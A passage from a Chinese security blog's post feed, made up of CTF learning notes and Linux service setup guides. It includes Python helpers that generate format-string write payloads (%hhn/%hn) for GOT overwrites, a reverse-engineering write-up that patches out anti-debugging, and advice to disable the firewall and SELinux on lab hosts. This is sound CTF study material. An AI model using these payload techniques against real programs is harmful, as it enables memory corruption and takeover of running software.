offset$hhn</code></p></li><li><p>当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）=0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 = 0xD0（208），也就是填入%208c%offset$hhn即可。</p></li></ol><p>当然这也是很规律的，在控制一个输出字符数，就分为3种情况：</p><ul><li>前面已经输出的字符数小于这次要输出的字符数</li><li>前面已经输出的字符数等于于这次要输出的字符数</li><li>前面已经输出的字符数大于这次要输出的字符数</li></ul><p>然后就可以写成一个脚本来实现自动化控制这个输出字符数：</p><p>单字节：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># prev 前面已经输出多少字符</span><span class="hljs-comment"># val 要写入的值</span><span class="hljs-comment"># idx  偏移</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_byte</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">1</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hhn"</span>    <span class="hljs-keyword">return</span> result<span class="hljs-comment">#搭配：</span>prev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span><span class="hljs-comment"># x就是你要写入的字节数，例如在改写64位got时常用是6，因为其前两个字节都一样</span><span class="hljs-comment"># idx是偏移，key是要写入的目标值</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(x):    payload +=fmt_byte(prev,(key &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>,idx+i)     prev = (key &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span></code></pre></div><p>双字节：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#跟上个基本一样，只是改了部分地方</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(x):    payload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,idx+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span></code></pre></div><p>在使用这两个脚本的时候，常用的<strong>是在获取到payload的时候也用<code>payload.ljust()</code>做好padding,来控制好字节对齐，然后再摆上需要写入x组的地址。（一会在题目中会有演示）</strong></p><h5 id="pwntools-pwnlib-fmtstr-模块"><a href="#pwntools-pwnlib-fmtstr-模块" class="headerlink" title="pwntools pwnlib.fmtstr 模块"></a>pwntools pwnlib.fmtstr 模块</h5><div class="hljs"><pre><code class="hljs python">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=<span class="hljs-number">0</span>, write_size=<span class="hljs-string">'byte'</span>)</code></pre></div><ul><li>offset (int):你控制的第一个格式化程序的偏移量</li><li>writes (dict):格式为 {addr: value, addr2: value2},用于往 addr 里写入 value (常用:<code>{printf_got}</code>)</li><li>numbwritten (int):已经由 printf 函数写入的字节数</li><li><code>write_size (str)</code>:必须是 byte,short 或 int。限制你是要逐 byte 写,逐 short 写还是逐 int 写(hhn,hn或n)</li></ul><p>这个函数是十分好用的，具体可以去看一下pwntools的官方介绍，但是实际使用当中，会发现几个问题：</p><ul><li>在64位中，并不好用，自动生成的payload中，它不会将地址放在格式化字符串之后，导致用不了。</li><li>在面对单次printf，实施多次写入的时候其更显的十分无力。</li></ul><p>记录到这里，理论部分就差不多完了，下一篇主要记录的就是题解篇，会包含一些技巧，常见的ctf格式化字符串题目漏洞利用的常见套路，还有格式化字符串漏洞的高级利用（当格式化字符串漏洞的buf在bss上，这就意味着我们无法直接往栈上写地址，该怎么办？并且这种题目常在赛题中出现）</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XCTF\_高校战疫赛\_RE-天津垓</title>
    <link href="/2020/03/11/XCTF_%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%B5%9B_RE_%20%E5%A4%A9%E6%B4%A5%E5%9E%93/"/>
    <url>/2020/03/11/XCTF_%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%B5%9B_RE_%20%E5%A4%A9%E6%B4%A5%E5%9E%93/</url>
    
    <content type="html"><![CDATA[<h1 id="XCTF-高校战疫赛-RE-天津垓"><a href="#XCTF-高校战疫赛-RE-天津垓" class="headerlink" title="XCTF_高校战疫赛_RE_ 天津垓_"></a>XCTF_高校战疫赛_RE_ 天津垓_</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复现一个题，当时只做出来第一层加密。因为还没怎么接触反调试跟代码混淆，做不下去了，不过下来复现发现了较为简单的办法出来这个题，也是学到很多，就记录一下。</p><h2 id="初步运行"><a href="#初步运行" class="headerlink" title="初步运行"></a>初步运行</h2><p>发现还需要装个cgwin1.dll，这个很好找，不过要注意64位系统，windows目录下的system32 跟syswow64都要放入。<br><img src="http://qiqianyun.chumen77.xyz/uPic/UJeTGU.png" srcset="/img/loading.gif" alt><br>看来是需要输入判断。</p><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/9N8fOI.png" srcset="/img/loading.gif" alt><br>这里就是第一层验证了，后来了解到这个是smc加密，我是直接写Python一位位爆破出来的。</p><div class="hljs"><pre><code class="hljs python">v39 = <span class="hljs-string">'Rising_Hopper!'</span>result = <span class="hljs-string">''</span>key = [<span class="hljs-number">17</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">42</span>,<span class="hljs-number">59</span>,<span class="hljs-number">47</span>,<span class="hljs-number">3</span>,<span class="hljs-number">47</span>,<span class="hljs-number">4</span>,<span class="hljs-number">16</span>,<span class="hljs-number">72</span>,<span class="hljs-number">62</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">16</span>]tag = [<span class="hljs-number">0x52</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x21</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    x = <span class="hljs-number">0</span>    flag = <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span> flag:        <span class="hljs-keyword">if</span> ~(x &amp; tag[i % <span class="hljs-number">14</span>]) &amp; (x | tag[i % <span class="hljs-number">14</span>])==key[i] :            flag = <span class="hljs-number">0</span>            result += chr(x)        <span class="hljs-keyword">else</span>:            x += <span class="hljs-number">1</span>print(result)<span class="hljs-comment">#result = 'Caucasus@s_ability'</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/KxEedJ.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/q0wQpI.png" srcset="/img/loading.gif" alt><br>然后进入这个函数，发现这里根据刚刚解出来的字符串，传入后对*<em>Unk_10040164D *</em> 做了一些处理然后又返回到这堆数据。<br><img src="http://qiqianyun.chumen77.xyz/uPic/bEqzBA.png" srcset="/img/loading.gif" alt><br>直接跟进去是没什么用的。所以需要动态调试，看看程序运行到这里，是怎么样的。</p><p>然后会发现，ida动态调试直接断掉了，肯定是有反调试了。x64可以调试，但是定位关键处有点难，并且看汇编代码也让自己这个菜鸡看吐了。所以就想办法破除对ida的反调试，然后到了关键代码也就是处理以后的Unk10040164D，看看逻辑是也想办法<strong>将其改变成伪代码</strong>，这样就好分析多了。</p><h3 id="patch程序"><a href="#patch程序" class="headerlink" title="patch程序"></a>patch程序</h3><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/A43P7J.png" srcset="/img/loading.gif" alt><br>跟进入引用函数，发现是利用窗口事件来检测是否被调试器调试。并且在其中也发现了ida，这里patch程序可以用<strong>010editor</strong>，直接把ida的相关字眼改成其他的就行。但是要注意不要破坏其他的数据：<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/o7Pjq9.png" srcset="/img/loading.gif" alt><br>我起初改成这样就不行，位位对齐，改成其他字符串就好了。</p><h3 id="ida动态调试："><a href="#ida动态调试：" class="headerlink" title="ida动态调试："></a>ida动态调试：</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/1biVvy.png" srcset="/img/loading.gif" alt><br>断在这里，然后进入这入Unk10040164D 函数的时候，F7进入：<br><img src="http://qiqianyun.chumen77.xyz/uPic/hyi1pE.png" srcset="/img/loading.gif" alt><br>发现已经有正常的汇编代码出来了（这里我的是已经修改过的），无法f5反编译，这时候可以在最初段push rbp 上面，右键新建一个函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rgwAq4.png" srcset="/img/loading.gif" alt><br>整完的样子：<br><img src="http://qiqianyun.chumen77.xyz/uPic/V3341J.png" srcset="/img/loading.gif" alt><br>然后就可以f5反编译了，并且很清晰的就可以看出程序逻辑：<br><img src="http://qiqianyun.chumen77.xyz/uPic/zuetQy.png" srcset="/img/loading.gif" alt><br>然后解密这里：</p><div class="hljs"><pre><code class="hljs python">flag = <span class="hljs-string">''</span>key = [<span class="hljs-number">2007666</span>,<span class="hljs-number">2125764</span>,<span class="hljs-number">1909251</span>,<span class="hljs-number">2027349</span>,<span class="hljs-number">2421009</span>,<span class="hljs-number">1653372</span>,<span class="hljs-number">2047032</span>,<span class="hljs-number">2184813</span>,<span class="hljs-number">2302911</span>,<span class="hljs-number">0x2289F9</span>,<span class="hljs-number">1909251</span>,<span class="hljs-number">2165130</span>,<span class="hljs-number">1968300</span>,<span class="hljs-number">0x223D16</span>,<span class="hljs-number">2066715</span>,<span class="hljs-number">2322594</span>,<span class="hljs-number">1987983</span>,<span class="hljs-number">0x223D16</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">2066715</span>,<span class="hljs-number">0x2289F9</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">0xEB773</span>,<span class="hljs-number">0xE6A90</span>,<span class="hljs-number">0xE6A90</span>,<span class="hljs-number">0xE6A90</span>,<span class="hljs-number">728271</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">0x2289F9</span>,<span class="hljs-number">2283228</span>,<span class="hljs-number">0x223D16</span>,<span class="hljs-number">2184813</span>,<span class="hljs-number">2165130</span>,<span class="hljs-number">2027349</span>,<span class="hljs-number">1987983</span>,<span class="hljs-number">0x223D16</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">2283228</span>,<span class="hljs-number">2047032</span>,<span class="hljs-number">1909251</span>,<span class="hljs-number">2165130</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">2401326</span>,<span class="hljs-number">1987983</span>,<span class="hljs-number">0x223D16</span>,<span class="hljs-number">2184813</span>,<span class="hljs-number">885735</span>,<span class="hljs-number">2184813</span>,<span class="hljs-number">2165130</span>,<span class="hljs-number">1987983</span>,<span class="hljs-number">2460375</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">51</span>) :    flag += chr(int(key[i] / <span class="hljs-number">19683</span>))print(flag)</code></pre></div><p>然后就拿到flag了。比起很多大师傅的dump核心代码，再进行分析，对我来说还是太难了。感觉在ida里到关键处，创建函数，生成伪代码更简单，也很清晰。</p>]]></content>
    
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux- DNS搭建记录</title>
    <link href="/2020/03/11/linux_%20DNS%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/11/linux_%20DNS%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>全称： domain name system<br><img src="http://qiqianyun.chumen77.xyz/uPic/lHjkck.png" srcset="/img/loading.gif" alt></p><h2 id="域名服务基础"><a href="#域名服务基础" class="headerlink" title="域名服务基础"></a>域名服务基础</h2><h3 id="DNS作用及类型"><a href="#DNS作用及类型" class="headerlink" title="DNS作用及类型"></a>DNS作用及类型</h3><h4 id="DNS-系统的作用-："><a href="#DNS-系统的作用-：" class="headerlink" title="DNS 系统的作用 ："></a>DNS 系统的作用 ：</h4><ul><li>正向解析：根据主机名称（域名）查找对应的 IP 地址（最常见）</li><li>反向解析：根据 IP 地址查找对应的主机域名（通信行业常用）</li></ul><h4 id="DNS-系统的工作模式："><a href="#DNS-系统的工作模式：" class="headerlink" title="DNS 系统的工作模式："></a>DNS 系统的工作模式：</h4><ul><li>递归查询 ：访问必须有一次一回，会返回成功或者失败。</li><li>迭代查询 ：多次访问，多次返回，必须返回一个正确的地址。<h4 id="域名结构："><a href="#域名结构：" class="headerlink" title="域名结构："></a>域名结构：</h4><img src="http://qiqianyun.chumen77.xyz/uPic/KgLSqJ.png" srcset="/img/loading.gif" alt><br>全世界有13台根域名服务器。<h4 id="BIND软件服务"><a href="#BIND软件服务" class="headerlink" title="BIND软件服务"></a>BIND软件服务</h4></li></ul><div class="hljs"><pre><code class="hljs html">服务名：named 端口号：53主配置文件：/etc/named.conf保存 DNS 解析记录的数据文件位于：/var/named/</code></pre></div><h4 id="主配置文件部分参数："><a href="#主配置文件部分参数：" class="headerlink" title="主配置文件部分参数："></a>主配置文件部分参数：</h4><div class="hljs"><pre><code class="hljs html">listen-on port 53 &#123; 127.0.0.1; &#125;; //要填入自己主机iplisten-on-v6 port 53 &#123; ::1; &#125;; allow-query     &#123; any; &#125;;//意思是给任何网段进行解析</code></pre></div><p>分别是: ipv4监听端口和ip地址，默认只有本地的<br>  ipv6的监听端口和ip地址</p><div class="hljs"><pre><code class="hljs html">recursion yes; // 递归还是迭代查询dnssec-enable yes; dnssec-validation yes; dnssec-lookaside auto;</code></pre></div><p>这个是dns控制防止欺骗用户。但是因为其加上了包的验证，再传给服务器时候，服务器进行拆包验证，会增加服务器的负荷，所以用的不多。</p><h4 id="区域文件部分参数："><a href="#区域文件部分参数：" class="headerlink" title="区域文件部分参数："></a>区域文件部分参数：</h4><div class="hljs"><pre><code class="hljs html">    zone "baidu.com" IN &#123;      type master;      file "baidu.localhost"; //本机记录文件名称（可以diy）      allow-update &#123; none; &#125;;       &#125;;     //正向    zone "131.140.168.192.in-addr.arpa" IN &#123;               type master;               file "baidu.empty";              allow-update &#123; none; &#125;;      &#125;;//反向//对于其中 file 自定义的名字，要与数据配置文件里面名字相同。</code></pre></div><h2 id="实验搭建过程"><a href="#实验搭建过程" class="headerlink" title="实验搭建过程"></a>实验搭建过程</h2><p>要求：www主机解析为172.16.10.5；ftp主机解析为172.16.10.6：mail主机解析为172.16.10.8：DNS主机解析为本机IP172.16.10.9；添加泛解析记录；同时添加www的别名记录ns1</p><h3 id="服务器主机"><a href="#服务器主机" class="headerlink" title="服务器主机"></a>服务器主机</h3><h4 id="关闭防火墙、SELinux"><a href="#关闭防火墙、SELinux" class="headerlink" title="关闭防火墙、SELinux"></a>关闭防火墙、SELinux</h4><div class="hljs"><pre><code class="hljs html">vi /etc/selinux/config</code></pre></div><p>把改成 SELINUX = disabled 然后<code>setenforce 0</code></p><p><code>systemctl stop firewalld.service</code> 关闭防火墙。</p><h4 id="配置主配置文件："><a href="#配置主配置文件：" class="headerlink" title="配置主配置文件："></a>配置主配置文件：</h4><div class="hljs"><pre><code class="hljs html">vi /etc/named.conf</code></pre></div><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/sgXisx.png" srcset="/img/loading.gif" alt><br>注意分号不要忘记，ip填的是本机地址。</p><h4 id="配置区域文件"><a href="#配置区域文件" class="headerlink" title="配置区域文件"></a>配置区域文件</h4><div class="hljs"><pre><code class="hljs html">vi /etc/named.rfc1912.zones</code></pre></div><div class="hljs"><pre><code class="hljs html">zone "chumen77.com" IN &#123;        type master;        file "chumen77.localhost";        allow-update &#123; none; &#125;;&#125;;zone "10.16.172.in-addr.arpa" IN &#123;        type master;        file "chumen77.loopback";        allow-update &#123; none; &#125;;&#125;;</code></pre></div><ul><li>其中注意反向解析时，ip地址的反写，还有写到ip地址第三个段。</li><li>并且正向解析和反向解析的文件名字要给记住，一会需要去按名称配置的。</li></ul><h4 id="配置正向反向解析数据文件"><a href="#配置正向反向解析数据文件" class="headerlink" title="配置正向反向解析数据文件"></a>配置正向反向解析数据文件</h4><div class="hljs"><pre><code class="hljs html">cp -p /var/named/named.localhost /var/named/chumen77.localhostcp -p /var/named/named.empty /var/named/chumen77.loopback</code></pre></div><ul><li>-p 是用来复制文件的权限情况。</li><li>来拷贝一下，方便直接修改。</li></ul><p>正向解析文件 ：</p><div class="hljs"><pre><code class="hljs html">$TTL 1D@       IN SOA  chumen77.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.chumen77.com.www     IN      A       172.16.10.5ftp     IN      A       172.16.10.6mail    IN      A       172.16.10.8dns     IN      A       172.16.10.131ns1     IN      CNAME   www*       IN      A       172.16.10.10</code></pre></div><p>反向解析文件：</p><div class="hljs"><pre><code class="hljs html">$TTL 3H@       IN SOA  chumen77.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.chumen77.com.5       PTR     www.chumen77.com.6       PTR     ftp.chumen77.com.8       PTR     mail.chumen77.com.131     PTR     dns.chumen77.com.*       PTR     xxx.chumen77.com.</code></pre></div><p>注意每个网址后面要加个点。</p><h4 id="检查和开启"><a href="#检查和开启" class="headerlink" title="检查和开启"></a>检查和开启</h4><p><code>named-checkzone</code> 可以对上面4个配置文件进行语法问题的检查，出现ok就是没什么问题了。</p><div class="hljs"><pre><code class="hljs html">systemctl start named</code></pre></div><p>开启服务，如果出现无法开启，有异常：</p><div class="hljs"><pre><code class="hljs html">cat /var/log/messages</code></pre></div><p>用这个命令去查那个配置文件里面的内容填错了，然后改一下就ok了。</p><h3 id="客户机设置"><a href="#客户机设置" class="headerlink" title="客户机设置"></a>客户机设置</h3><h4 id="网卡设置"><a href="#网卡设置" class="headerlink" title="网卡设置"></a>网卡设置</h4><div class="hljs"><pre><code class="hljs html">vi /etc/sysconfig/network-scripts/ifcfg-ens33</code></pre></div><p>修改网卡信息 ：</p><div class="hljs"><pre><code class="hljs html">DNS1=192.168.140.131</code></pre></div><p>要在最后加上你dns服务器的ip。注意是 <code>DNS1</code>. 设置好后重启网卡。</p><div class="hljs"><pre><code class="hljs html">service network restart</code></pre></div><h4 id="测速是否成功"><a href="#测速是否成功" class="headerlink" title="测速是否成功"></a>测速是否成功</h4><p>使用一下 <code>nslookup</code><br><img src="http://qiqianyun.chumen77.xyz/uPic/MaK7Sw.png" srcset="/img/loading.gif" alt></p><p>正向反向都成功了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux\_ftp服务搭建踩坑记录</title>
    <link href="/2020/03/11/linux_ftp%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/11/linux_ftp%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="linux-ftp服务搭建简单记录"><a href="#linux-ftp服务搭建简单记录" class="headerlink" title="linux_ftp服务搭建简单记录_"></a>linux_ftp服务搭建简单记录_</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>简单记录一下，ftp的相关需要记录的知识跟搭建所踩的坑。</p><h2 id="两种服务模式"><a href="#两种服务模式" class="headerlink" title="两种服务模式"></a>两种服务模式</h2><ul><li>主动模式：FTP服务器主动向客户端发起连接请求。</li><li>被动模式：FTP服务器等待客户端发起连接请求（FTP的默认工作模式）。<h2 id="vsftpd服务程序"><a href="#vsftpd服务程序" class="headerlink" title="vsftpd服务程序"></a>vsftpd服务程序</h2>ftp是Linux系统中以命令行界面的方式来管理FTP传输服务的客户端工具。我们首先手动安装这个ftp客户端工具，以便在后续实验中查看结果。<br>vsftpd作为更加安全的文件传输的服务程序，允许用户以<strong>三种认证模式</strong>登录到FTP服务器上。</li><li><strong>匿名开放模式</strong>：是一种最不安全的认证模式，任何人都可以无需密码验证而直接登录到FTP服务器。</li><li><strong>本地用户模式</strong>：是通过<strong>Linux系统本地的账户密码</strong>信息进行认证的模式，相较于匿名开放模式更安全，而且配置起来也很简单。但是如果被黑客破解了账户的信息，就可以畅通无阻地登录FTP服务器，从而完全控制整台服务器。</li><li><strong>虚拟用户模式</strong>：是这三种模式中最安全的一种认证模式，它需要为FTP服务单独建立用户数据库文件，虚拟出用来进行口令验证的账户信息，而这些账户信息在服务器系统中实际上是不存在的，仅供FTP服务程序进行认证使用。这样，即使黑客破解了账户信息也无法登录服务器，从而有效降低了破坏范围和影响。<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><div class="hljs"><pre><code class="hljs html">yum -y install vsftpd</code></pre></div></li></ul><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>主配置文件路径 ：</p><div class="hljs"><pre><code class="hljs html">/etc/vsftpd/vsftpd.conf</code></pre></div><p>常用的配置参数以及作用如下：</p><div class="hljs"><pre><code class="hljs html">参数                                作用listen=[YES|NO]              是否以独立运行的方式监听服务listen_address=IP地址        设置要监听的IP地址listen_port=21               设置FTP服务的监听端口download_enable＝[YES|NO]    是否允许下载文件userlist_enable=[YES|NO]     设置用户列表为“允许”还是“禁止”操作userlist_deny=[YES|NO]      设置用户列表为“允许”还是“禁止”操作max_clients=0                最大客户端连接数，0为不限制max_per_ip=0                 同一IP地址的最大连接数，0为不限制anonymous_enable=[YES|NO]    是否允许匿名用户访问anon_upload_enable=[YES|NO]  是否允许匿名用户上传文件anon_umask=022               匿名用户上传文件的umask值anon_root=/var/ftp           匿名用户的FTP根目录anon_mkdir_write_enable=[YES|NO]    是否允许匿名用户创建目录anon_other_write_enable=[YES|NO]    是否开放匿名用户的其他写入权限（包括重命名、删除等操作权限）anon_max_rate=0               匿名用户的最大传输速率（字节/秒），0为不限制local_enable=[YES|NO]         是否允许本地用户登录FTPlocal_umask=022                本地用户上传文件的umask值local_root=/var/ftp            本地用户的FTP根目录chroot_local_user=[YES|NO]    是否将用户权限禁锢在FTP目录，以确保安全local_max_rate=0              本地用户最大传输速率（字节/秒），0为不限制</code></pre></div><p>在配置着的时候，注意对在这里对应起来，来控制匿名模式跟本地用户的部分权限。</p><h3 id="开启vsftpd服务"><a href="#开启vsftpd服务" class="headerlink" title="开启vsftpd服务"></a>开启vsftpd服务</h3><div class="hljs"><pre><code class="hljs html">service vsftpd start  systemctl start vsftpd</code></pre></div><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><h3 id="0x1-："><a href="#0x1-：" class="headerlink" title="0x1 ："></a>0x1 ：</h3><p>因为是实验机，随便折腾，为了实验的成功，需要<strong>关闭防火墙</strong> 和<strong>SELinux服务</strong>。</p><h4 id="防火墙："><a href="#防火墙：" class="headerlink" title="防火墙："></a>防火墙：</h4><p>CentOS7.0版本的linux系统的防火墙是firewalld，其他版本的可能是iptables。<br>firewalld防火墙关闭代码：</p><div class="hljs"><pre><code class="hljs html">关闭防火墙systemctl stop firewalld.service永久禁止防火墙 systemctl disable firewalld.service检查防火墙状态 systemctl status firewalld.service提示：Active: inactive (dead)就表示关闭了。</code></pre></div><p>iptables防火墙关闭代码 ：</p><div class="hljs"><pre><code class="hljs html">查询防火墙状态    :    service  iptables status停止防火墙   :        service   iptables stop启动防火墙   :        service   iptables start重启防火墙   :        service   iptables restart永久关闭防火墙    : chkconfig   iptables off永久关闭后启用    :   chkconfig   iptables on</code></pre></div><h4 id="SELinux服务："><a href="#SELinux服务：" class="headerlink" title="SELinux服务："></a>SELinux服务：</h4><p><code>setsebool -P ftpd_full_access=on</code>单独处理ftpd。</p><p>或：关闭SELinux</p><div class="hljs"><pre><code class="hljs html">$ vi /etc/selinux/config</code></pre></div><p>将 SELINUX=XXX –&gt;XXX 代表级别<br>改为** SELINUX=disabled**<br>然后重启系统，或者执行命令：<code>setenforce 0</code>。</p><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2:"></a>0x2:</h3><p>发现匿名用户，在连上ftp服务器时候，无法进行写入东西。</p><div class="hljs"><pre><code class="hljs html">550 Permission denied.</code></pre></div><p>然后这个目录是:</p><div class="hljs"><pre><code class="hljs html">/var/ftp/pub</code></pre></div><p>这就是把这个pub的属主控制为 控制为ftp即可。</p><div class="hljs"><pre><code class="hljs html">chown ftp pub</code></pre></div><p>这样就可以了。</p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3:"></a>0x3:</h3><p>在本地用户的时候，用root也是无法连接ftp服务的。这是因为vsftpd服务程序所在的目录中默认存放着两个名为“用户名单”的文件（<code>ftpusers和user_list</code>）把ftpusers这里面的root去掉即可。</p><h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4:"></a>0x4:</h3><ul><li>在采用本地用户模式登录FTP服务器后，默认访问的是该用户的家目录，也就是说，访问的是/home/linuxprobe目录(系统创建的用户，在home文件夹下都有对应用户名的文件夹)。而且该目录的默认所有者、所属组都是该用户自己，因此不存在写入权限不足的情况。如果读写权限没给，手动设定，给读写权限。</li><li>采用非本地用户模式登录，与采用本地用户模式的区别是：采用非本地用户模式<strong>可以指定FTP文件夹</strong>。<br>￼￼￼￼￼￼￼</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安恒抗疫赛</title>
    <link href="/2020/02/29/%E5%AE%89%E6%81%92%E6%8A%97%E7%96%AB%E8%B5%9B/"/>
    <url>/2020/02/29/%E5%AE%89%E6%81%92%E6%8A%97%E7%96%AB%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="安恒抗疫赛"><a href="#安恒抗疫赛" class="headerlink" title="安恒抗疫赛"></a>安恒抗疫赛</h1><p>很简单的比赛，题也不多，记录一下做的2道简单的Re。</p><h2 id="re1-pyc"><a href="#re1-pyc" class="headerlink" title="re1_pyc"></a>re1_pyc</h2><p>拿到的是一个pyc文件。直接拿到网站上反编译一下：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> string<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">caser</span><span class="hljs-params">(flag)</span>:</span>    enc1 = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:        enc1 += chr(ord(i) - <span class="hljs-number">5</span>)        <span class="hljs-keyword">return</span> enc1<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rail</span><span class="hljs-params">(flag)</span>:</span>    p1 = <span class="hljs-string">''</span>    p2 = <span class="hljs-string">''</span>    p3 = <span class="hljs-string">''</span>    enc2 = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(flag)):        j = i % <span class="hljs-number">3</span>        <span class="hljs-keyword">if</span> j == <span class="hljs-number">0</span>:            p1 += flag[i]            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">if</span> j == <span class="hljs-number">1</span>:            p2 += flag[i]            <span class="hljs-keyword">continue</span>        p3 += flag[i]        enc2 = p1 + p2 + p3    <span class="hljs-keyword">return</span> enc2<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rep</span><span class="hljs-params">(flag)</span>:</span>    table1 = <span class="hljs-string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span>    table2 = <span class="hljs-string">'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'</span>    table = string.maketrans(table1, table2)    <span class="hljs-keyword">return</span> flag.translate(table, <span 